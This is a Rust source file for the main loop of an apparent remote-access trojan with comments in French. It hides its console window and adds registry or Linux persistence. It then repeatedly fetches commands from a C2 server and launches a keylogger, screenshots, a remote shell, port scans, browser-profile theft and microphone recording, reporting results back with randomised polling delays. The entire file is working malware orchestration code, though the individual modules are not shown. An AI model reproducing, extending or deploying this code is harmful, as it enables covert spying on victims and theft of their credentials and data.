#![windows_subsystem = "windows"]
mod connexion;
mod input;
mod logs;
mod network_scanner;
mod screenshot;
mod shell;
use rand::Rng;
use tokio::task::JoinHandle;
mod browser_info;
mod mic_rec;
mod persistance;

fn setup_persistence() {
    #[cfg(target_os = "windows")]
    {
        let _ = persistance::add_to_registry();
    }

    #[cfg(target_os = "linux")]
    {
        let _ = persistance::setup_persistence_linux();
    }
}

#[tokio::main]
async fn main() {
    setup_persistence();

    let mut active_tasks: Vec<JoinHandle<()>> = Vec::new();

    loop {
        match connexion::get_directives().await {
            Ok(commands) => {
                println!("Commands received: {:?}", commands);

                for command in commands {
                    let handle = match command.as_str() {
                        "keylogger" => tokio::spawn(async {
                            println!("Démarrage du keylogger...");
                            match input::start_keylogger(10).await {
                                Ok(_) => {
                                    println!("Keylogger terminé");
                                    let _ = connexion::send_directive_status(
                                        "keylogger",
                                        "success",
                                        "Terminé",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur keylogger: {:?}", e);
                                    let _ = connexion::send_directive_status(
                                        "keylogger",
                                        "error",
                                        &format!("{:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        "screenshot" => tokio::spawn(async {
                            println!("Prise de screenshot...");
                            match screenshot::take_screenshot().await {
                                Ok(_) => {
                                    println!("Screenshot terminé");
                                    let _ = connexion::send_directive_status(
                                        "screenshot",
                                        "success",
                                        "Terminé",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur screenshot: {:?}", e);
                                    let _ = connexion::send_directive_status(
                                        "screenshot",
                                        "error",
                                        &format!("{:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        "logs" => tokio::spawn(async {
                            println!("Récupération des logs système...");
                            match logs::get_sysinfo().await {
                                Ok(_) => {
                                    let _ = connexion::send_directive_status(
                                        "logs", "success", "Terminé",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur logs: {:?}", e);
                                    let _ = connexion::send_directive_status(
                                        "logs",
                                        "error",
                                        &format!("{:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        "shell" => tokio::spawn(async {
                            println!("Démarrage du shell distant");
                            match shell::launch_shell().await {
                                Ok(_) => {
                                    let _ = connexion::send_directive_status(
                                        "shell",
                                        "success",
                                        "Session shell terminée",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur shell : {}", e);
                                    let _ = connexion::send_directive_status(
                                        "shell",
                                        "error",
                                        &format!("Erreur shell : {:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        "network_scan" => tokio::spawn(async {
                            println!("Démarrage du scanner de réseau");
                            match network_scanner::scan_all_ports().await {
                                Ok(_) => {
                                    let _ = connexion::send_directive_status(
                                        "network_scan",
                                        "success",
                                        "Terminé",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur network_scan : {}", e);
                                    let _ = connexion::send_directive_status(
                                        "network_scan",
                                        "error",
                                        &format!("Erreur  : {:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        "browser_info" => tokio::spawn(async {
                            println!("Démarrage de récupération de profils");
                            match browser_info::process_browser_profiles().await {
                                Ok(_) => {
                                    let _ = connexion::send_directive_status(
                                        "browser_info",
                                        "success",
                                        "Terminé",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur browser_info : {}", e);
                                    let _ = connexion::send_directive_status(
                                        "browser_info",
                                        "error",
                                        &format!("Erreur  : {:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        "mic_rec" => tokio::spawn(async {
                            println!("Démarrage de l'enregistrement micro");
                            match mic_rec::record_mic().await {
                                Ok(_) => {
                                    let _ = connexion::send_directive_status(
                                        "mic_rec", "success", "Terminé",
                                    )
                                    .await;
                                }
                                Err(e) => {
                                    eprintln!("Erreur mic_rec : {}", e);
                                    let _ = connexion::send_directive_status(
                                        "mic_rec",
                                        "error",
                                        &format!("Erreur  : {:?}", e),
                                    )
                                    .await;
                                }
                            }
                        }),
                        _ => {
                            println!("Commande inconnue: {}", command);
                            continue;
                        }
                    };

                    active_tasks.push(handle);
                }
            }
            Err(e) => eprintln!("Erreur avec la connexion au C2: {}", e),
        }

        active_tasks.retain(|handle| !handle.is_finished());

        let delay = rand::rng().random_range(5..15);
        tokio::time::sleep(std::time::Duration::from_secs(delay)).await;
    }
}
